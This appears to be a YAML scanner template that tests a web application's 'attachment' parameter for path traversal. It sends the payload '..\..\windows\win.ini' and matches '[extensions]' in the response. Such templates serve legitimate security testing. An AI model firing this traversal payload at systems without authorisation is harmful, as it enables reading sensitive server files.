id: lfi6-1236
name: 'Traversal in attachment'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via attachment'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      attachment:
        - '..\..\windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
